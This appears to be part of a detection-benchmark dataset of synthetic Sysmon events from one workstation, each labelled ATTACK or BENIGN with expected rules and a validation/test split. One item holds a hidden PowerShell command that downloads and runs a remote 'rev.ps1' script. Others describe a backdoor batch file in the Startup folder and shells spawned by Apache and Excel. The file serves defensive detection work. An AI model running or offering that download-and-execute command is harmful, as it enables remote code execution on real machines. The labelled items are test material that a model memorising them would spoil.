  {
    "id": "SCEN-SYSMON-VAL-008",
    "ground_truth": "ATTACK",
    "category": "suspicious_network_connection",
    "desc": "Rundll32 makes outbound connection to port 1337",
    "expected_rule": "ENDPOINT-003",
    "events": [
      {
        "timestamp": "2026-10-08T10:06:10+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E3-6300-1791453970",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "rundll32.exe",
        "parent_process": null,
        "process_id": 6300,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\rundll32.exe",
        "file_hash": null,
        "source_ip": "10.0.0.15",
        "destination_ip": "198.51.100.88",
        "source_port": 54000,
        "destination_port": 1337,
        "protocol": "tcp",
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_network_connection",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Network Connection: rundll32.exe (PID: 6300) 10.0.0.15:54000 -> 198.51.100.88:1337 (tcp)",
        "raw_reference": "GUID-E3-6300",
        "raw_log": "{\"EventID\": 3, \"Image\": \"C:\\\\Windows\\\\System32\\\\rundll32.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "validation",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-VAL-009",
    "ground_truth": "ATTACK",
    "category": "suspicious_dns",
    "desc": "PowerShell queries ngrok tunneling domain",
    "expected_rule": "ENDPOINT-004",
    "events": [
      {
        "timestamp": "2026-10-08T10:06:20+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E22-6400-1791453980",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": null,
        "process_id": 6400,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": "agent-tunnel.ngrok.io",
        "dns_response": "198.51.100.120",
        "event_type": "sysmon_dns_query",
        "event_category": "endpoint",
        "severity": "low",
        "message": "DNS Query: agent-tunnel.ngrok.io by powershell.exe (PID: 6400)",
        "raw_reference": "agent-tunnel.ngrok.io",
        "raw_log": "{\"EventID\": 22, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "validation",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-VAL-010",
    "ground_truth": "ATTACK",
    "category": "suspicious_file_creation",
    "desc": "Cmd.exe writes executable script to Startup folder",
    "expected_rule": "ENDPOINT-005",
    "events": [
      {
        "timestamp": "2026-10-08T10:06:30+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E11-6500-1791453990",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "cmd.exe",
        "parent_process": null,
        "process_id": 6500,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\cmd.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_file_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "File Create: C:\\Users\\jsmith\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat by cmd.exe (PID: 6500)",
        "raw_reference": "C:\\Users\\jsmith\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat",
        "raw_log": "{\"EventID\": 11, \"Image\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "validation",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-001",
    "ground_truth": "BENIGN",
    "category": "normal_process",
    "desc": "Developer compiles code using csc.exe",
    "events": [
      {
        "timestamp": "2026-10-08T10:06:40+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-7100-1791454000",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "csc.exe",
        "parent_process": "cmd.exe",
        "process_id": 7100,
        "parent_process_id": 5300,
        "command_line": "csc.exe /target:exe Program.cs",
        "image_path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: csc.exe (PID: 7100) by cmd.exe (PPID: 5300)",
        "raw_reference": "GUID-E1-7100",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\", \"CommandLine\": \"csc.exe /target:exe Program.cs\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-002",
    "ground_truth": "BENIGN",
    "category": "normal_network",
    "desc": "Teams client establishes call media over port 443",
    "events": [
      {
        "timestamp": "2026-10-08T10:06:50+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E3-7200-1791454010",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "ms-teams.exe",
        "parent_process": null,
        "process_id": 7200,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Program Files\\WindowsApps\\MSTeams_24000.0\\ms-teams.exe",
        "file_hash": null,
        "source_ip": "10.0.0.15",
        "destination_ip": "198.51.100.15",
        "source_port": 55001,
        "destination_port": 443,
        "protocol": "tcp",
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_network_connection",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Network Connection: ms-teams.exe (PID: 7200) 10.0.0.15:55001 -> 198.51.100.15:443 (tcp)",
        "raw_reference": "GUID-E3-7200",
        "raw_log": "{\"EventID\": 3, \"Image\": \"C:\\\\Program Files\\\\WindowsApps\\\\MSTeams_24000.0\\\\ms-teams.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-003",
    "ground_truth": "BENIGN",
    "category": "normal_dns",
    "desc": "OneDrive sync queries live.com",
    "events": [
      {
        "timestamp": "2026-10-08T10:07:00+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E22-7300-1791454020",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "OneDrive.exe",
        "parent_process": null,
        "process_id": 7300,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": "api.onedrive.live.com",
        "dns_response": "13.107.136.9",
        "event_type": "sysmon_dns_query",
        "event_category": "endpoint",
        "severity": "low",
        "message": "DNS Query: api.onedrive.live.com by OneDrive.exe (PID: 7300)",
        "raw_reference": "api.onedrive.live.com",
        "raw_log": "{\"EventID\": 22, \"Image\": \"C:\\\\Program Files\\\\Microsoft OneDrive\\\\OneDrive.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-004",
    "ground_truth": "BENIGN",
    "category": "normal_powershell",
    "desc": "Scheduled task runs maintenance PowerShell script",
    "events": [
      {
        "timestamp": "2026-10-08T10:07:10+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-7400-1791454030",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": "taskeng.exe",
        "process_id": 7400,
        "parent_process_id": 900,
        "command_line": "powershell.exe -NoProfile -File C:\\Scripts\\maintenance.ps1",
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: powershell.exe (PID: 7400) by taskeng.exe (PPID: 900)",
        "raw_reference": "GUID-E1-7400",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -NoProfile -File C:\\\\Scripts\\\\maintenance.ps1\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-005",
    "ground_truth": "BENIGN",
    "category": "normal_process",
    "desc": "Windows Calculator launched by user",
    "events": [
      {
        "timestamp": "2026-10-08T10:07:20+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-7500-1791454040",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "Calculator.exe",
        "parent_process": "explorer.exe",
        "process_id": 7500,
        "parent_process_id": 1024,
        "command_line": "Calculator.exe",
        "image_path": "C:\\Program Files\\WindowsApps\\CalculatorApp\\Calculator.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: Calculator.exe (PID: 7500) by explorer.exe (PPID: 1024)",
        "raw_reference": "GUID-E1-7500",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Program Files\\\\WindowsApps\\\\CalculatorApp\\\\Calculator.exe\", \"CommandLine\": \"Calculator.exe\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-006",
    "ground_truth": "BENIGN",
    "category": "normal_file_create",
    "desc": "Visual Studio writes project debug pdb file",
    "events": [
      {
        "timestamp": "2026-10-08T10:07:30+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E11-7600-1791454050",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "devenv.exe",
        "parent_process": null,
        "process_id": 7600,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Program Files\\Microsoft Visual Studio\\devenv.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_file_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "File Create: C:\\Users\\jsmith\\Projects\\App\\bin\\Debug\\App.pdb by devenv.exe (PID: 7600)",
        "raw_reference": "C:\\Users\\jsmith\\Projects\\App\\bin\\Debug\\App.pdb",
        "raw_log": "{\"EventID\": 11, \"Image\": \"C:\\\\Program Files\\\\Microsoft Visual Studio\\\\devenv.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-007",
    "ground_truth": "BENIGN",
    "category": "normal_network",
    "desc": "Git pushes changes over HTTPS port 443",
    "events": [
      {
        "timestamp": "2026-10-08T10:07:40+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E3-7700-1791454060",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "git.exe",
        "parent_process": null,
        "process_id": 7700,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Program Files\\Git\\bin\\git.exe",
        "file_hash": null,
        "source_ip": "10.0.0.15",
        "destination_ip": "140.82.121.4",
        "source_port": 56000,
        "destination_port": 443,
        "protocol": "tcp",
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_network_connection",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Network Connection: git.exe (PID: 7700) 10.0.0.15:56000 -> 140.82.121.4:443 (tcp)",
        "raw_reference": "GUID-E3-7700",
        "raw_log": "{\"EventID\": 3, \"Image\": \"C:\\\\Program Files\\\\Git\\\\bin\\\\git.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-008",
    "ground_truth": "ATTACK",
    "category": "suspicious_process_execution",
    "desc": "PowerShell invoked with invoke-expression download payload",
    "expected_rule": "ENDPOINT-001",
    "events": [
      {
        "timestamp": "2026-10-08T10:07:50+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-8100-1791454070",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": "cmd.exe",
        "process_id": 8100,
        "parent_process_id": 5300,
        "command_line": "powershell.exe -w hidden invoke-expression (New-Object Net.WebClient).DownloadString('http://198.51.100.99/rev.ps1')",
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: powershell.exe (PID: 8100) by cmd.exe (PPID: 5300)",
        "raw_reference": "GUID-E1-8100",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -w hidden invoke-expression (New-Object Net.WebClient).DownloadString('http://198.51.100.99/rev.ps1')\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-009",
    "ground_truth": "ATTACK",
    "category": "suspicious_parent_child",
    "desc": "Apache web server spawns cmd.exe shell",
    "expected_rule": "ENDPOINT-002",
    "events": [
      {
        "timestamp": "2026-10-08T10:08:00+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-8200-1791454080",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "cmd.exe",
        "parent_process": "httpd.exe",
        "process_id": 8200,
        "parent_process_id": 2200,
        "command_line": "cmd.exe /c dir C:\\",
        "image_path": "C:\\Windows\\System32\\cmd.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: cmd.exe (PID: 8200) by httpd.exe (PPID: 2200)",
        "raw_reference": "GUID-E1-8200",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": \"cmd.exe /c dir C:\\\\\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-010",
    "ground_truth": "ATTACK",
    "category": "suspicious_parent_child",
    "desc": "Excel spawns wscript.exe script engine",
    "expected_rule": "ENDPOINT-002",
    "events": [
      {
        "timestamp": "2026-10-08T10:08:10+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-8300-1791454090",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "wscript.exe",
        "parent_process": "EXCEL.EXE",
        "process_id": 8300,
        "parent_process_id": 3600,
        "command_line": "wscript.exe //B C:\\Users\\Public\\macro.vbs",
        "image_path": "C:\\Windows\\System32\\wscript.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: wscript.exe (PID: 8300) by EXCEL.EXE (PPID: 3600)",
        "raw_reference": "GUID-E1-8300",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": \"wscript.exe //B C:\\\\Users\\\\Public\\\\macro.vbs\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-011",
    "ground_truth": "ATTACK",
    "category": "suspicious_network_connection",
    "desc": "Regsvr32 initiates outbound network connection to port 8443",
    "expected_rule": "ENDPOINT-003",
    "events": [
      {
        "timestamp": "2026-10-08T10:08:20+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E3-8400-1791454100",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "regsvr32.exe",
        "parent_process": null,
        "process_id": 8400,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\regsvr32.exe",
        "file_hash": null,
        "source_ip": "10.0.0.15",
        "destination_ip": "198.51.100.60",
        "source_port": 57000,
        "destination_port": 8443,
        "protocol": "tcp",
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_network_connection",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Network Connection: regsvr32.exe (PID: 8400) 10.0.0.15:57000 -> 198.51.100.60:8443 (tcp)",
        "raw_reference": "GUID-E3-8400",
        "raw_log": "{\"EventID\": 3, \"Image\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-012",
    "ground_truth": "ATTACK",
    "category": "suspicious_dns",
    "desc": "Command shell queries burpcollaborator testing staging domain",
    "expected_rule": "ENDPOINT-004",
    "events": [
      {
        "timestamp": "2026-10-08T10:08:30+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E22-8500-1791454110",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "cmd.exe",
        "parent_process": null,
        "process_id": 8500,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\cmd.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": "test1.burpcollaborator.net",
        "dns_response": "198.51.100.200",
        "event_type": "sysmon_dns_query",
        "event_category": "endpoint",
        "severity": "low",
        "message": "DNS Query: test1.burpcollaborator.net by cmd.exe (PID: 8500)",
        "raw_reference": "test1.burpcollaborator.net",
        "raw_log": "{\"EventID\": 22, \"Image\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-013",
    "ground_truth": "ATTACK",
    "category": "suspicious_file_creation",
    "desc": "Wscript drops executable in Temp directory",
    "expected_rule": "ENDPOINT-005",
    "events": [
      {
        "timestamp": "2026-10-08T10:08:40+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E11-8600-1791454120",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "wscript.exe",
        "parent_process": null,
        "process_id": 8600,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\wscript.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_file_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "File Create: C:\\Users\\jsmith\\AppData\\Local\\Temp\\update_service.exe by wscript.exe (PID: 8600)",
        "raw_reference": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\update_service.exe",
        "raw_log": "{\"EventID\": 11, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-TEST-014",
    "ground_truth": "ATTACK",
    "category": "suspicious_network_connection",
    "desc": "Cmd.exe initiates outbound connection to port 31337",
    "expected_rule": "ENDPOINT-003",
    "events": [
      {
        "timestamp": "2026-10-08T10:08:50+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E3-8700-1791454130",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "cmd.exe",
        "parent_process": null,
        "process_id": 8700,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\cmd.exe",
        "file_hash": null,
        "source_ip": "10.0.0.15",
        "destination_ip": "198.51.100.90",
        "source_port": 58000,
        "destination_port": 31337,
        "protocol": "tcp",
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_network_connection",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Network Connection: cmd.exe (PID: 8700) 10.0.0.15:58000 -> 198.51.100.90:31337 (tcp)",
        "raw_reference": "GUID-E3-8700",
        "raw_log": "{\"EventID\": 3, \"Image\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "test",
    "events_count": 1
  }
]